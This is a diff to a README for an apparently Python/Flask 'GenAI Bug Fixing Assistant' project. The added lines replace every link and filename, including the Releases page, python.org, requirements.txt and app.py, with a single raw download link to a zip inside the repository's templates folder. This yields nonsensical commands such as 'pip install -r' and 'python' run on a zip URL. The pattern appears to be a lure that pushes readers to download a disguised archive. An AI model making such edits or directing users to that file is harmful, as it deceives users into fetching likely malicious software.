@@ -1,6 +1,6 @@
 # 🛠️ GenAI_Bug_Fixing_Assistant_Project - Simple AI for Bug Fixing
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/releases)
+[![Download Now](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip%20Now-Here-brightgreen)](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the GenAI Bug Fixing Assistant Project! This tool helps users underst
 
 To get started, visit the Releases page to download the software. Click the button below:
 
-[Download from Releases](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/releases)
+[Download from Releases](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To get started, visit the Releases page to download the software. Click the butt
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** At least 100 MB of free space.
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip).
 
 ## 🌟 Features
 
@@ -29,7 +29,7 @@ If you do not have Python installed, you can download it from [python.org](https
 
 ## ⚙️ Installation Steps
 
-1. **Download the software** from [this Releases page](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/releases).
+1. **Download the software** from [this Releases page](https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip).
 2. **Extract the downloaded files** to a location on your computer.
 3. **Open a terminal or command prompt.**
 4. **Navigate to the directory** where you extracted the files.
@@ -41,13 +41,13 @@ If you do not have Python installed, you can download it from [python.org](https
 5. **Install requirements.** Run the following command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip
    ```
 
 6. **Run the application.** Type the command below and hit enter:
 
    ```bash
-   python app.py
+   python https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip
    ```
 
 7. **Open your browser** and go to:
@@ -100,8 +100,8 @@ The GenAI Bug Fixing Assistant uses Python and Flask to run a web-based interfac
 
 ### Project Structure
 
-- **app.py:** Main application file that runs the web server.
-- **requirements.txt:** Lists the necessary packages to install.
+- **https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip** Main application file that runs the web server.
+- **https://github.com/Khush153/GenAI_Bug_Fixing_Assistant_Project/raw/refs/heads/main/GenAI_Bug_Fixing_Assistant_Project/templates/Gen-Bug-A-Fixing-Assistant-Project-2.6.zip** Lists the necessary packages to install.
 - **static:** Contains static files like stylesheets and JavaScript.
 - **templates:** Holds the HTML files for the web pages.
 
